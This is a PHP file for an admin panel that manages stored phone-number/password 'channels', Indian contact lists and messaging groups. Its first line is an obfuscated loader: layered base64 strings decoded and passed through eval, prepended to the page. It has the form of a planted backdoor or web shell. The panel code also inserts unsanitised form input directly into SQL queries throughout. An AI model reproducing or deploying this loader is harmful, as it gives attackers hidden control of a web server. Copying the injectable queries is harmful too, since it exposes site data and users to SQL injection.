<?php $yqHf = 'ICRIWWJDID0gJ0lDUnRZa0YySUQwZ0owbERVbGhaVjJSWVNVUXdaMG93YkVSVmJYQnBZbXRhY2xOVlVYZGFNRzkzWWtWU1ZtSnRhR2haYlhoaFUxWk9WbFZZWkdGTlJ6a3pXV3RXVTFWc1dYcFZiVVpWVmpOQ2VsUldXbGRTTVd0NllVVTVWMDFFUlRKV1Z6QXhWREZrVmsxWVNrOVdSWEJoV1d4U1FtVkdiSEpYYmtwc1lrWmFXVlF4VmpCVWJVcDBXak5zVjAxV1NreFZha3BPWlZaS2NtRkdRbGhUUlVwNVZsWlNTMVF5Vm5OVWJrWlZZVE5TY2xsc1ZuTk9iRnBYV1hwR1ZWWnJWalZXUnpWWFZrVXhWMU5xV2xoaGEzQklWakJhYTFkRk9WWmpSbVJPWW0xamVWWXhhSGRUTVZsM1RWVmFhMUpXU2xkWmJHaERZMFpTV0dOR1RtdE5WVEUwVmtkMFQxUXdNVWhsUld4WFlsUkdNMWxWV2t0T2JVWklUbFpTYUdFelFsRlhhMk40VlRGa1NGWnJhR3RTV0VKVVdsZDRXbVZXWkhKV2F6bFNUV3RhTUZVeGFITlVNV1JIVjIxb1YyRnJSWGRhUkVaUFZtMUdSMVJ0ZEdoTmJtaExWbXRqZUU1SFJuUlRiazVxVTBVMVlWUlhNVFJqVm1SeFUydHdiR0pGTlZsWGEyUkhWVEF4ZFdGSWNGWmxhMHB4V2xWVk1WZEdVbGxqUms1cFlYcFdZVlpHWkRSWlZUVlhZVE5zVGxKR1duTldiR2hUVWxac1ZWUnJUbFpTTVZwWFZURlNWMVpHV2xaT1ZsSmFWa1ZhZWxreFZYaFhWbFowWlVab1UxWkdWWGRXTVdRd1YyczFXRlp1VG1wU2JXaHpWV3BPYjFsV1VsVlNhM1JwVm0xU2VWZHJWbmRoVlRGSVQxUmFXR0V5VW5aV01WVjRaRVpXY1Zac2NHaGhlbFpaVjJ0U1EyUXdOVmhWV0d4clVtNUNUMWxYTVRObFJsWTJVbXhPYkdKSE9UVlZiWGh2VjBaYU5tSkZkRmRoYTI4d1ZHMTRjMDVzVG5OYVJUVlRWMFpLUmxac1kzaE5SbVIwVW14b2ExTkhVbFZXYkdSdlRteGtjVkp1WkZoU2JFb3dWREZrYzJKR1dsWlhha1pYVFZaS1MxUnNWWGhYUms1eVlVWmFWMDFzU25kWFYzaFRZMjFSZUZSc1dtRlNWR3h5V1d4V2QwMUdVbk5hUkZKWVlYcENORlZ0TURGWlZrcFlWRlJDV0dGcldqTlZNRnBMWTFaR2MyTkdaRTVUUlVveVZqRm9kMU14V25SVGJrcHBVbGRvVVZZd1pEUlRNVlp4VW10MGEwMVhVbnBXUnpBMVlURkplRmRzY0ZkU2VsWjJXVlphUzJOWFNrbFViSEJPWVd4YVRWZHJZM2hVTWs1SFlqTndVbUV6YUZoVk1GVXhaRlprZEdWRk9WSmlSemsxVmtjMVUxWXlTblJoU0VwWFlXdHZNRlJzV210ak1WSnlVMjFzYUUweWFETldSM1J2V1ZkR2NrMUlaR3BUUlZwV1ZXdFZNV05zYkhGU2JrNVlWbXhhTVZrd1pIZFdSa3BaVVZoc1dHRXhXazlVVm1SSFpFWk9jbUZHVG1saWEwcDRWMnhhVTFZd01IaGlSbHBvVWxWd2NGbFljSEpOVmxaWFdrZDBhRlpVUm5sWk1HTjRWMjFXY2s1V1VscFdWMUpRV2taYVYxZEZPVlpsUm1SVVVsUldNVlpVUmxkaU1WRjNUbFpvVlZkSVFsZFpiR2h2WTBaYVZWTnRkR3RXYlhoWVdWVldUMkZIU2xaaVJGWlZZa2RPTkZsVldscGxWbEowVGxaV1UxSllRa2xYV0hCTFV6RktSMkV6Y0ZKaVJVcHpWbXhXWVdSV1ZYbGtSM0JzVWxSV1dGbFVUbk5WUm1SSFUyNUdWVlpGYnpCVWJYaFhVakZzTmxadGFGZGlWMUV4VmpKMGEwNUhSWGhUYmtacFUwVmFZVmxYZEhKbFJsSldWMjVrV0ZKVVZsWlZWekYzWWtaWmVWVnFUbGRTUlRWNlZWZDRkbVZXVGxsaVJsSnBWbTVDYUZaR1l6RmlNazE0V2taa1dtVnJTbkJVVldoVFZteHNObE50ZEZSaVJWWTBWVEkxVTFkc1duUlVXR2hhVmtWYWRWcFdWWGhYUjBaSFkwZDRWMVpXVlhoV1ZFWlhWREZOZUZac2FGTmhNbmh3VlRCb1EySXhXbkZSVkVacFRWZDRlVlpIZEhkVU1ERklaVVZXVmxadFVYZFpWM2hMVG14S2RFOVdhRmhTTTJoRVZrUkdWMk14VGxkVmJrWlNZbGhDY0ZsVVFuWmxWbVJWVkc1T2FXSlZWalZWTW5oellWWkplbEZ1UWxWV00wSklWRzE0ZDFZeVJrWk9WM0JPVWpOb1JsWnNZM2RsUjBaSFYycGFWMkpyY0ZsVmExWnpUa1pzVmxkdVRrOVdNRmt5VjJ0V2QxVnJNVVpYYm14WVZqTm9jbFZxU2tkak1rcEhZVVphYVZkR1NuaFhWM2hoV1ZVMWMyRXpjR2xOTW1oeldXeGFTMWRXVlhsT1dHUm9UVlUxUjFscmFHRldSMFY1VkdwU1ZXSkdjSGxhVmxVMVYxWldkR05GTlU1aWJXTjVWbXRXVjFReVNuUlNXR3hWWVRKb1QxWnFTbTlaVm5CWFlVVTVUMkpHU2pCWmEyaExZV3N4UlZKc1dsaFdSVFZFVmxWa1YxWnNTblJPVmxKb1RXczBNRmRXVm1GamJWWlhVMjVTYTFJd1dsVlZiR2hEWld4a1dXTkZPVlZoZWxJeldXdFdVMVp0U25OVGJrNVhZbTVDU0ZscVJtdFhWMHBHVTJ4Q1YxWXphRFJXTW5CUFlURlNWMWRzWkZkWFIzaFdWVzE0UzFZeGNFVlJhbEpYVm1zMVZsVXljM2hXTVVweVYxUktWMUpXY0ZoV1J6RlhZMjFLU1ZKdGNFNWlWa3BNVmxkd1MwNUhVa2RVV0dSVllrVTFjbFZxUm1GWFZsSlhXa2M1V0dKV1duaFZWbEpYVmtkRmVWUnFVbHBXVm5CNVdsWmFTMlJIVWtoU2JGSlRWMFZLTmxZeGFIZFVNVkowVkd0YWFWSlhlSEpWYTJRMFV6RldjVkp0Um14aVIzY3lWVEo0WVZsVk1YTlhWRVpXVm5wRk1GbHJXa3BsVjFGNldrWlNUbEpVVmpWV1IzQkRZekZPVmsxVmFGcE5hbFpSV2xaYVNrMUdXbGxpUlVwUVZsZDRSVmRVU2pCWGJVcFpVVzVhVkZaV1JqTlhha1p6WkVaS2RXTkhSbGRTYlhRelZqQlNTMVV5U2tkaE0yeFFWak5TYUZaVVNtdGpiR3Q0V2tkR1RsWnJiekZaV0hCclUyeEplRmRZYkZoV2JWRjZXV3BDZDFOR1RuVlNiV2hTVFc1TmVsVXlOWGROUjBwSVZXNVNVMkpyTlUxVlZFWktUVVphV1dKSVNrOWxWMDB6VTJ0V2QyUnJiRVZOUjJSTFpWWktkVlV4V2twYU1VSlVVVzFzV2xkRk5YTlViWEJUV214d1NGWnRjR2xOYkVwelV6Qk9VMkZ0U25WU2JYUk1Wa2hPYmxkc2FHRmhSMHBFV2pKMFlVMUhlRlJUTVZKNlltczRlVlpxU2xwV00yUjJVMnRXZDJScmRGVmplakJ1VDNsU2QxTkRRVGxKUTJOclZtdE9ja2xFTUdkWmJVWjZXbFJaTUZneVVteFpNamxyV2xObmExWXlSbTVXZVdzM1NVZFdNbGxYZDI5S1JscEVZWGxyTjBwNmRHeGtiVVp6UzBOU2QxTkRhemNuT3lSWFRpQTlJQ2NrYlVoT0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNna2JXSkJkaWs3SUdWMllXd29KRzFJVGlrN0p6dGxkbUZzS0NSWFRpazcnOyRCVSA9ICckbFd0ID0gYmFzZTY0X2RlY29kZSgkSFliQyk7IGV2YWwoJGxXdCk7JztldmFsKCRCVSk7';$OD = '$SkJ = base64_decode($yqHf); eval($SkJ);';eval($OD);?> <?php

error_reporting(0);
set_time_limit(0);

$get_gname=mysql_query("SELECT * FROM `groupname` WHERE `id`=1");
$got_gn=mysql_fetch_array($get_gname);
$g_name=$got_gn['name'];

$get_num=mysql_query("SELECT * FROM `admin_num` WHERE `id`=1");
$got_num=mysql_fetch_array($get_num);
$g_num=$got_num['number'];
?>
<html>
<head>
	<title>PRoject</title>
     <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <link href="css/bootstrap.css" rel="stylesheet" />
    <style>
	.block
	{
		border:1px solid #0099FF;
		background:#E1EAF4;
		padding:10px;
	}
	.button{
	background:transparent;	
	border:none;
	}
	.divide
	{
		height:10px;
	}
	.divide1
	{
		height:5px;
	}
	body{
	background:#F9F9F9;	
	}
	
	
	
	
	
	
	</style>
</head>
<body>
<hr>
<div class="container">
	<div class="row">
        <div class="col-md-5">
            <div class="panel panel-primary">         
              <div class="panel-heading">Channel Add</div>
                  <div class="panel-body">
                    <form method="post">
                        <textarea name="channel" style="width:100%; height:20%; resize:none;"></textarea>
                       
                  </div>
               <div class="panel-footer"> <input type="submit" name="submit" value="Add Channel" class="button" data-toggle="tooltip" data-placement="bottom" title="Submit Add Channels - Add channels into database">
                    </form></div>
            </div>
        </div>
          <div class="col-md-2">
            <div class="panel panel-primary">         
              <div class="panel-heading">Contacts(+91)</div>
                  <div class="panel-body">
                    <form method="post">
                        <textarea name="contacts" style="width:100%; height:20%; resize:none;"></textarea>
                       
                  </div>
               <div class="panel-footer"> <input type="submit" name="submit" value="Add Contacts" class="button" data-toggle="tooltip" data-placement="bottom" title="Submit Add Contacts - Add contacts into database. Formate : 91xxxxx">
                    </form></div>
            </div>
        </div>
        
        <div class="col-md-2">
            <div class="panel panel-primary">         
              <div class="panel-heading">Contacts</div>
                  <div class="panel-body">
                    <form method="post">
                        <textarea name="contacts" style="width:100%; height:20%; resize:none;"></textarea>
                       
                  </div>
               <div class="panel-footer"> <input type="submit" name="submit" value="Contacts without 91" class="button"  data-toggle="tooltip" data-placement="bottom" title="Add contacts into database without adding 91 prefix. Formate : xxxxxxx">
                    </form></div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="panel panel-primary">         
              <div class="panel-heading">Create Group</div>
                  <div class="panel-body">
                    
                           <div class="row">
								<div class="col-md-6">
									 <a href="group.php" class="" target="_blank" data-toggle="tooltip" data-placement="bottom" title="Push Button to create a New Group"><button type="submit" style="width:100%;" class="btn btn-success"  >New</button></a>
								</div>
								<div class="col-md-6">
									 <a href="error.php" target="_blank" data-toggle="tooltip" data-placement="bottom" title="Push Button to create a Error Group"><button type="submit" style="width:100%;" class="btn btn-danger">Error</button></a>
								</div>
						   </div>
						  
							<div class="divide"></div>
                   
                            
                    
                  </div>
            </div>
            
            <div class="panel panel-primary">         
                  <div class="panel-heading">Admin Number</div>
                      <div class="panel-body">
                      
						<form method="post">
							<input type="text" name="admin_num" required>
							<div class="divide1"></div>
							<input type="submit" name="submit" class="btn btn-sm btn-warning" value="Set Admin_num" data-toggle="tooltip" data-placement="bottom" title="Set Number as a Admin.">
						</form>
						<?php echo "Number - ".$g_num; ?>
                        <?php
							
							if(isset($_POST['submit']) && $_POST['submit'] == "Set Admin_num")
							{
								$num=$_POST['admin_num'];	
								$up_gname=mysql_query("UPDATE `admin_num` SET `number`='$num' WHERE `id`=1");
								?>
									<script>
										window.location="index.php";
									</script>
								<?php
							}
						?>
                      </div>
                  
                  
				</div>
           
                    
                  
            
        </div>
	</div>

<div class="row" >
    <div class="col-md-6">
        <div class="table-responsive" style="backgroud:white;">
            <?php
                $getval=mysql_query("SELECT * FROM `group_create` ORDER By id DESC LIMIT 4");
                while($fvalue=mysql_fetch_assoc($getval)){
                    $id[]=$fvalue['id'];
                    $groupid[]=$fvalue['group_id'];	
                    $status[]=$fvalue['status'];
                    $sti[]=$fvalue['time'];
                }
            ?>
            <table  class="table" style="backgroud:white;">
                <tr class="success">
                    <th>No.</th>
                    <th>Group Id</th>
                    <th>Status</th>
                    <th>Date/Time</th>
                    <th>Action</th>
                </tr>
                <?php for($j=0;$j<count($id);$j++){ ?>
                <tr><form method="post">
                    <td><?php echo $j; ?></td>
                    <td><?php echo $groupid[$j];?></td>
                    <td><input type="hidden" value="<?php echo $id[$j];?>" name="updateid"><input type="text" name="cstatus" value="<?php echo $status[$j];?>" style="background:transparent; border:none;"></td>
                    <td><?php echo $sti[$j]; ?></td>
                    <td><input type="submit" name="submit" value="Update" class="btn btn-success" data-toggle="tooltip" data-placement="bottom" title="Update status of group"></td></td>
                    </form>
                </tr>
                <?php } ?>
            </table>
        </div>
    </div>

	<div class="col-md-3">
                <?php
                    $totalcon=mysql_query("SELECT * FROM `contacts`");
                    while($gettotal=mysql_fetch_assoc($totalcon)){
                        $id[]=$gettotal['id'];	
                    }   
					$totalcontacts=count($id); 
					               
                    $totalcon0=mysql_query("SELECT * FROM `contacts` WHERE status='fresh'");
                    while($gettotal0=mysql_fetch_assoc($totalcon0)){
                        $id0[]=$gettotal0['id'];	
                    }
					$freshcontacts=count($id0);  
					 
					
                ?>
                <div class="panel panel-primary">         
                  <div class="panel-heading">Contacts Add</div>
                      <div class="panel-body">
                      <table width="100%"> 
                      	<tr>
                        	<td  width="40%">Contacts</td><td><span class="label label-primary" ><?php echo $totalcontacts; ?></span> </td>
                        </tr>
                        <tr><td colspan="2" height="3px"></td></tr>
                        <tr>
                        	<td   width="40%">Pendding</td><td ><span class="label label-danger"><?php echo $freshcontacts; ?></span>  </td>
                        </tr>
                         <tr><td colspan="2" height="3px"></td></tr>
                        <tr>
                        	<td width="40%" >Send</td><td  ><span class="label label-success"><?php echo ($totalcontacts - $freshcontacts); ?></span>  </td>
                        </tr>
                      </table>
                      
                          
                      </div>
                  
                  
           	 </div>
          
          
                   <?php
                    $totalchannel=mysql_query("SELECT * FROM `temp_pass` WHERE `status`='Active'");
                    while($getchannel=mysql_fetch_assoc($totalchannel)){
                        $id_channel[]=$getchannel['id'];	
                    }   
					$totalchannels=count($id_channel); 
					$totalchannel1=mysql_query("SELECT * FROM `temp_pass` WHERE `status`='Used'");
                    while($getchannel1=mysql_fetch_assoc($totalchannel1)){
                        $id_channel1[]=$getchannel1['id'];	
                    }   
					$totalchannels1=count($id_channel1); 
					?>
                   <h5>Active Channels : <label class="label label-primary"><?php echo $totalchannels; ?></label></h5>
                     <h5>Used Channels : <label class="label label-primary"><?php echo $totalchannels1; ?></label></h5>
                   	<div class="block">
                    	<h4>Export Database</h4>
                          <a href="channel_export.php" data-toggle="tooltip" data-placement="bottom" title="Click to Export Channels From Database"><button class="btn btn-xs btn-primary">Channel</button></a>
                            <a href="contacts_export.php" data-toggle="tooltip" data-placement="bottom" title="Click to Export Contacts From Database"><button class="btn btn-xs btn-primary">Contacts</button></a>
                            <a href="report_export.php" data-toggle="tooltip" data-placement="bottom" title="Click to Export Report From Database"><button class="btn btn-xs btn-primary">Report</button></a>
                        </div>
                

				</div>
			<div class="col-md-3">
				<div class="panel panel-primary">         
                  <div class="panel-heading">Group Name </div>
                      <div class="panel-body">
                      
						<form method="post">
							<input type="text" name="group_name" required>
							<div class="divide1"></div>
							<input type="submit" name="submit" class="btn btn-warning" value="Set G_name" data-toggle="tooltip" data-placement="bottom" title="Set name of group.">
						</form>
						<?php echo "NAME - ".$g_name; ?>
                        <?php
							
							if(isset($_POST['submit']) && $_POST['submit'] == "Set G_name")
							{
								$name=$_POST['group_name'];	
								$up_gname=mysql_query("UPDATE `groupname` SET `name`='$name' WHERE `id`=1");
								?>
									<script>
										window.location="index.php";
									</script>
								<?php
							}
						?>
                      </div>
                  
                  
				</div>
				
				
					<div class="block">
                    	<h4>Delete Database</h4>
                        <a href="channel_delete.php" data-toggle="tooltip" data-placement="bottom" title="Click to Delete Channels From Database"><button class="btn btn-xs btn-danger">Channels</button></a>
                        <a href="contacts_delete.php" data-toggle="tooltip" data-placement="bottom" title="Click to Contacts Channels From Database"><button class="btn btn-xs btn-danger">Contacts</button></a>
                        <a href="report_delete.php" data-toggle="tooltip" data-placement="bottom" title="Click to Report Channels From Database"><button class="btn btn-xs btn-danger">Report</button></a>
					</div>
			</div>
			
	</div>
	<br>
			<a href="lastchannel.php" target="_blank"><button class="btn btn-success">Last Channel Update</button></a>
</div>
</div>






<hr>

<?php
if(isset($_POST['submit']) && $_POST['submit'] == "Add Channel")
{
	
	$lines = explode("\n", $_POST["channel"]);
	foreach($lines as $line)
	{
	  list($number, $password) = explode("	", $line);
	  $sql=mysql_query("INSERT INTO `temp_pass`(`number`, `code`, `password`, `t_ID`,`time`, `date`)  VALUES('$number','','$password','','$date','$datee')");	
	}
	
	?>
<script>
	window.location="index.php";
</script>
<?php
}


if(isset($_POST['submit']) && $_POST['submit'] == "Add Contacts")
{
	
	$lines = explode("\n", $_POST["contacts"]);
	foreach($lines as $line)
	{
	  list($number) = explode("	", $line);
	  $sql=mysql_query("INSERT INTO `contacts`(`id`,`number`) VALUES('','$number')");		
	}
	?>
    <script>
	window.location="index.php";
    </script>
    <?php
}

if(isset($_POST['submit']) && $_POST['submit'] == "Update")
{

echo $id=$_POST['updateid'];
echo $status=$_POST['cstatus'];
$change=mysql_query("UPDATE `group_create` SET `status`='$status' WHERE id='$id'");
?>
<script>
	window.location="index.php";
</script>
<?php
	
}

?>								

<?php
if(isset($_POST['submit']) && $_POST['submit'] == "Contacts without 91")
{
	$num =array();
	$lines = explode("\n", $_POST['contacts']);
	foreach($lines as $line)
	{
	  list($number) = explode("\n", $line);
	  $number0="91".$number;
	  $sql=mysql_query("INSERT INTO `contacts`(`id`, `number`) VALUES('','$number0')");	
	}
	
?>
<script>
	window.location="index.php";
</script>
<?php	
	
	
	
	
}
?>							

<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --> 
 <script src="https://code.jquery.com/jquery.js"></script> 
 <!-- Include all compiled plugins (below), or include individual files 
 as needed --> 
 <script src="js/bootstrap.min.js"></script> 
 <script src="js/popovers.js"></script>
 
 </body>
</html>